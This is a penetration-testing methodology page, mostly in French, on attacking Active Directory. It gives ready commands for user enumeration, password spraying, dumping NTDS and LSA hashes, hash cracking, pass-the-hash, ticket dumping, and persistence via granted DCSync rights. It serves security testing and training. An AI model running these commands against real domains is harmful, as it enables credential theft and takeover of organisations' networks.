# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d'un réseau. Il est conçu pour être évolutif, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure d'**Active Directory** se compose de trois couches principales : **domaines**, **arbres** et **forests**. Un **domaine** englobe une collection d'objets, tels que des **utilisateurs** ou des **périphériques**, partageant une base de données commune. Les **arbres** sont des groupes de ces domaines reliés par une structure commune, et une **forest** représente l'ensemble de plusieurs arbres, interconnectés par des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Les concepts clés dans **Active Directory** incluent :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités dans l'annuaire, y compris les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domain** – Sert de conteneur pour les objets de l'annuaire, avec la capacité pour plusieurs domaines de coexister au sein d'une **forest**, chacun conservant sa propre collection d'objets.
4. **Tree** – Un regroupement de domaines partageant un domaine racine commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs arbres avec des **trust relationships** entre eux.

**Active Directory Domain Services (AD DS)** englobe une gamme de services critiques pour la gestion centralisée et la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, y compris l'**authentification** et les fonctionnalités de **recherche**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications activées par l'annuaire via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les utilisateurs à travers plusieurs applications web en une seule session.
5. **Rights Management** – Aide à protéger le contenu soumis au droit d'auteur en régulant sa distribution et son usage non autorisés.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez simplement accès à un environnement AD mais que vous n'avez aucune credentials/sessions, vous pouvez :

- **Pentest the network:**
- Scanner le réseau, trouver les machines et les ports ouverts et essayer d'**exploiter des vulnérabilités** ou d'**extraire des credentials** à partir d'elles (par exemple, [les printers peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- L'énumération DNS peut fournir des informations sur des serveurs clés du domaine comme web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la page générale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour plus d'informations sur la façon de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions Windows modernes) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur la manière d'énumérer un serveur SMB peut être trouvé ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur la manière d'énumérer LDAP peut être trouvé ici (prêtez une **attention particulière à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Récupérer des credentials en **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à un hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérer des credentials en **exposant** des [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire des usernames/noms à partir de documents internes, réseaux sociaux, services (principalement web) à l'intérieur des environnements de domaine et également à partir des sources publiques.
- Si vous trouvez les noms complets des employés de l'entreprise, vous pouvez essayer différentes conventions de **username** AD (**[lire ceci](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Lorsqu'un **username invalide est demandé**, le serveur répondra avec le code d'erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui nous permet de déterminer que le username était invalide. Les **usernames valides** déclencheront soit un **TGT in a AS-REP** en réponse, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer la pré-authentification.
- **No Authentication against MS-NRPC** : Utiliser auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune credentials. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. Les recherches peuvent être consultées [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération d'utilisateurs** à son encontre. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez avoir le **nom des personnes travaillant dans l’entreprise** à partir de l'étape de recon que vous auriez dû effectuer auparavant. Avec le prénom et le nom de famille, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d’utilisateur potentiels valides.

### Knowing one or several usernames

Ok, donc vous savez déjà que vous avez un nom d’utilisateur valide mais pas de mots de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être capable d’**obtenir** certains **hashes** de challenge à cracker en **empoisonnant** certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer Active Directory vous aurez **plus d’emails et une meilleure compréhension du réseau**. Vous pourriez être capable de forcer des [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM pour obtenir l’accès à l’environnement AD.

### Steal NTLM Creds

Si vous pouvez **accéder à d’autres PC ou partages** avec l’**utilisateur null ou guest** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés, déclencheront une **authentification NTLM contre vous** afin que vous puissiez **voler** le **challenge NTLM** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** considère chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d’autres formats plus lents dont le matériau clé est dérivé directement du NT hash. Au lieu de bruteforcer de longues phrases de passe dans des tickets Kerberos RC4, des challenges NetNTLM, ou des credentials cachés, vous injectez les NT hashes dans les modes NT-candidate de Hashcat et laissez vérifier la réutilisation des mots de passe sans jamais connaître le texte en clair. Ceci est particulièrement puissant après une compromission de domaine où vous pouvez récolter des milliers de NT hashes actuels et historiques.

Utilisez le shucking lorsque :

- Vous avez un corpus NT provenant de DCSync, de dumps NTDS/SAM/SECURITY, ou de vaults d’identifiants et devez tester la réutilisation dans d’autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM, ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation pour de longues phrases de passe inextricables et pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le NT hash (par exemple Kerberos etype 17/18 AES). Si un domaine impose AES-only, vous devez revenir aux modes de mot de passe réguliers.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées d’historique élargissent considérablement le pool de candidats car Microsoft peut stocker jusqu’à 24 hashes précédents par compte. Pour d’autres façons de récolter les secrets NTDS voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine en cache (DCC/DCC2). Dédupliquez et ajoutez ces hashes au même fichier `nt_candidates.txt`.
- **Track metadata** – Conservez le nom d’utilisateur/domaine qui a produit chaque hash (même si le wordlist ne contient que des hex). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
- Préférez les candidats provenant de la même forêt ou d’une forêt de confiance ; cela maximise la probabilité de chevauchement lors du shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes :

- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides) car le mangling corrompt le matériau clé du candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l’espace de clés NT (~30 000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée coûte bien moins cher que d’explorer tout l’espace de mots de passe dans le format lent.
- Exécutez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 ont été ajoutés récemment.
- Il n’existe actuellement pas de mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair car leurs clés sont dérivées via PBKDF2 depuis des mots de passe UTF-16LE, pas depuis des NT hashes bruts.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l’un de vos NT hashes existants.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez éventuellement récupérer le plaintext plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

Le même workflow s’applique aux challenge-responses NetNTLM (`-m 27000/27100`) et DCC (`-m 31500`). Une fois une correspondance identifiée, vous pouvez lancer des attaques de relais, PtH SMB/WMI/WinRM, ou re-cracker le NT hash avec des masques/règles hors-ligne.



## Enumerating Active Directory WITH credentials/session

Pour cette phase, vous devez avoir **compromis les credentials ou une session d’un compte de domaine valide.** Si vous avez des credentials valides ou un shell en tant qu’utilisateur de domaine, **rappelez-vous que les options données précédemment restent des options pour compromettre d’autres utilisateurs.**

Avant de commencer l’énumération authentifiée, vous devriez connaître le **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir lancer l’**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs vulnérables possibles, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les noms d’utilisateur** et essayer le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pourriez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus furtif
- Vous pouvez également [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil excellent pour le recon dans Active Directory est [**BloodHound**](bloodhound.md). Il n’est **pas très furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous dérange pas**, vous devriez totalement l’essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d’autres groupes, etc.
- **D’autres outils d’énumération AD automatisés sont :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l’annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des credentials dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d’autres méthodes.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez également essayer des outils automatisés comme :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d’obtenir tous les noms d’utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Enumeration semble courte, c’est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et pratiquez jusqu’à être à l’aise. Pendant une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider qu’il n’y a rien à faire.

### Kerberoast

Kerberoasting consiste à obtenir des **TGS tickets** utilisés par des services liés à des comptes utilisateurs et à cracker leur chiffrement — qui est basé sur les mots de passe utilisateurs — **hors ligne**.

Plus à ce sujet dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des credentials vous pouvez vérifier si vous avez accès à une **machine** quelconque. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter à plusieurs serveurs via différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des credentials ou une session en tant qu’utilisateur de domaine standard et que vous avez **accès** avec cet utilisateur à **n’importe quelle machine du domaine**, vous devriez essayer de trouver un moyen d’**escalader les privilèges localement et de récupérer des credentials**. C’est parce que seulement avec des privilèges administrateur locaux vous pourrez **dumper les hashes d’autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il y a une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). Aussi, n’oubliez pas d’utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **improbable** que vous trouviez des **tickets** dans l’utilisateur courant vous donnant la **permission d’accéder** à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory, vous disposerez de **plus d'e-mails et d'une meilleure compréhension du réseau**. Vous pourriez être capable de forcer des NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Recherche de Creds dans les partages d'ordinateurs | SMB Shares

Maintenant que vous avez quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés dans l'AD**. Vous pouvez le faire manuellement mais c'est une tâche très ennuyeuse et répétitive (d'autant plus si vous trouvez des centaines de docs à vérifier).

[**Suivez ce lien pour en savoir plus sur les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Voler les NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou partages** vous pouvez **placer des fichiers** (comme un fichier SCF) qui, si quelqu'un y accède, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **voler** le **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalade de privilèges sur Active Directory AVEC des identifiants/session privilégiée

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas : vous avez besoin de certains privilèges/identifiants spéciaux pour effectuer ces attaques.**

### Hash extraction

Avec un peu de chance vous avez réussi à **compromettre un compte admin local** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (y compris relaying), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Ensuite, il est temps de dumper tous les hashes en mémoire et localement.  
[**Lisez cette page sur les différentes façons d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.  
Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, de sorte que lorsque n'importe quelle **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.  
[**Lisez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM d'un utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans des réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant ainsi un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous avez le **hash** ou le **mot de passe** d'un **administrateur local**, vous devriez essayer de **vous connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que c'est assez **bruyant** et **LAPS** permettrait de l'**atténuer**.

### Abus de MSSQL et liens de confiance

Si un utilisateur a les privilèges pour **access MSSQL instances**, il pourrait les utiliser pour **execute commands** sur l'hôte MSSQL (si le service tourne en tant que SA), **steal** le NetNTLM **hash** ou même effectuer une **relay attack**.\
De plus, si une instance MSSQL est trusted (database link) par une autre instance MSSQL et que l'utilisateur a des privilèges sur la base de données trusted, il pourra **use the trust relationship to execute queries also in the other instance**. Ces relations de confiance peuvent être chaînées et à un moment donné l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent même à travers les relations de confiance entre forêts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abus des plateformes d'inventaire et de déploiement

Les suites tierces d'inventaire et de déploiement exposent souvent des chemins puissants vers les credentials et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous avez des privilèges sur la machine, vous pourrez dump TGTs depuis la mémoire de tous les utilisateurs qui se connectent sur l'ordinateur.\
Ainsi, si un **Domain Admin logins onto the computer**, vous pourrez dump son TGT et vous faire passer pour lui en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce au constrained delegation vous pourriez même **automatiquement compromettre un Print Server** (avec un peu de chance ce sera un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un user ou un computer est autorisé pour la "Constrained Delegation", il pourra **impersonate any user to access some services in a computer**.\
Ensuite, si vous **compromise the hash** de cet user/ordinateur vous serez capable de **impersonate any user** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abus des Permissions/ACLs

L'utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine** qui pourraient vous permettre d'effectuer des **mouvements latéraux**/**escalader** des privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abus du service Printer Spooler

Découvrir un **Spool service listening** dans le domaine peut être **abusé** pour **acquérir de nouveaux credentials** et **escalader des privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abus des sessions de tiers

Si **d'autres utilisateurs** **access** la machine **compromised**, il est possible de **gather credentials from memory** et même **inject beacons in their processes** pour les usurper.\
Habituellement les utilisateurs accèdent au système via RDP, voici donc comment effectuer quelques attaques sur des sessions RDP de tiers :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système pour gérer le **mot de passe de l'Administrator local** sur les ordinateurs joints au domaine, en garantissant qu'il est **randomized**, unique et fréquemment **changed**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs uniquement pour les utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, le pivoting vers d'autres machines devient possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Récupérer des certificates** depuis la machine compromise peut être un moyen d'escalader les privilèges dans l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **templates vulnérables** sont configurés, il est possible de les abuser pour escalader les privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation avec un compte à haut privilège

### Dumping Domain Credentials

Une fois que vous obtenez des privilèges de **Domain Admin** ou, mieux, **Enterprise Admin**, vous pouvez **dump** la **base de données du domaine** : _ntds.dit_.

[**Plus d'informations sur l'attaque DCSync ici**](dcsync.md).

[**Plus d'informations sur comment voler le NTDS.dit ici**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc comme persistance

Certaines des techniques discutées précédemment peuvent être utilisées pour la persistance.\
Par exemple, vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre des utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder les privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**attaque Silver Ticket** crée un **ticket Ticket Granting Service (TGS) légitime** pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** implique qu'un attaquant obtienne l'accès au **NTLM hash du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est spécial car il est utilisé pour signer tous les **Ticket Granting Tickets (TGTs)**, qui sont essentiels pour l'authentification au sein du réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte de son choix (attaque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ceux-ci sont comme des golden tickets forgés de manière à **contourner les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

